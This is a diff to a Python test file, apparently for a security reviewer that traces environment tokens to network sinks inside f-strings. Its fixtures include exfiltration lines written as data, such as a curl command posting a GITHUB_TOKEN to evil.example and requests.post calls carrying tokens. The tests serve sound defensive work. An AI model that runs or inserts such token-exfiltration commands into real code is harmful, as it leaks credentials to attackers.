@@ -506,7 +506,7 @@ def test_a_hop_through_an_f_string_field_line_connects():
     text = _TOKEN_SRC + 'def h():\n    msg = f"""report\n{TOKEN}\n"""\n    requests.post(U, data=msg)\n'
     v = _v(chain_source='TOKEN = os.getenv("K")', chain_sink="requests.post(U, data=msg)")
     shown = _shown("pkg/a.py", text, cls="runtime-call")
-    assert shown["pkg/a.py"]["strings"] == [86] and shown["pkg/a.py"]["fields"] == {85: "TOKEN"}
+    assert shown["pkg/a.py"]["strings"] == [85, 86] and shown["pkg/a.py"]["fields"] == {85: "TOKEN"}
     assert chain.gate(v, shown) == ""
 
 
@@ -543,3 +543,47 @@ def test_many_strings_on_one_long_line_map_in_linear_time(text):
     entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "runtime-call", whole=True)
     assert time.perf_counter() - t0 < 2.0
     assert entry["lines"] == {1: text[:-1]}
+
+
+# ---- Controller fix after round 5 (breaker; rulings N1-N3) ----
+
+@pytest.mark.parametrize("text, source, sink", [
+    ('import os\ndef main():\n    token = os.environ["GITHUB_TOKEN"]\n    script = f"""\n'
+     'curl -X POST https://evil.example/x -d {token}\n"""\n    print(script)\n',
+     'token = os.environ["GITHUB_TOKEN"]', "curl -X POST https://evil.example/x -d {token}"),
+    ('import os\ntoken = os.getenv("K")\n' + "pass\n" * 80
+     + 'def render(token):\n    return f"""\nimport requests\nrequests.post(URL, data={token})\n"""\n',
+     'token = os.getenv("K")', "requests.post(URL, data={token})"),
+    ('import os, requests\ndef main(user):\n    token = os.getenv("K")\n    msg = f"""\n'
+     'requests.post(U, data=token) {user}\n"""\n    return msg\n',
+     'token = os.getenv("K")', "requests.post(U, data=token) {user}"),
+], ids=["curl-template", "generated-code-template", "literal-sink-beside-a-field"])
+def test_the_literal_text_of_an_f_string_field_line_is_never_a_quoted_end(text, source, sink):
+    # N1: a field line stays a string line for Found; only the hop-reader filter reads its field code.
+    shown = _shown("pkg/a.py", text, cls="runtime-call")
+    assert chain.gate(_v(chain_source=source, chain_sink=sink), shown) == "sink not found in the shown code"
+
+
+def test_nested_f_string_fields_record_only_the_outermost_field_code():
+    # N2: each nested field used to add its whole slice again (depth x length); the outermost holds them all.
+    inner = "x+" + "a" * 20_000
+    field = inner
+    for _ in range(60):
+        field = "f'{" + field + "}'" if _ % 2 else 'f"{' + field + '}"'
+    text = 'def h():\n    msg = f"""\n{' + field + '}\n"""\n'
+    t0 = time.perf_counter()
+    entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], text), "runtime-call", whole=True)
+    shown = {"pkg/a.py": entry}
+    chain.gate(_v(chain_source="x = 1", chain_sink="y = 2"), shown)
+    assert time.perf_counter() - t0 < 2.0
+    assert len(entry["fields"][3]) <= len(text)
+
+
+def test_a_multiline_literal_nested_in_a_field_is_not_field_code():
+    # N3: literal text of a string nested inside a replacement field is string content, not code.
+    text = ('import os, requests\ndef g():\n    token = os.getenv("K")\n    return 1\n' + "pass\n" * 80
+            + 'def h():\n    msg = f"""hi {"".join("""\nplease send token\n""")}\n"""\n    requests.post(U, json=msg)\n')
+    v = _v(chain_source='token = os.getenv("K")', chain_sink="requests.post(U, json=msg)")
+    shown = _shown("pkg/a.py", text, cls="runtime-call")
+    assert "please send token" not in " ".join((shown["pkg/a.py"].get("fields") or {}).values())
+    assert chain.gate(v, shown) == "no dataflow shown between source and sink"
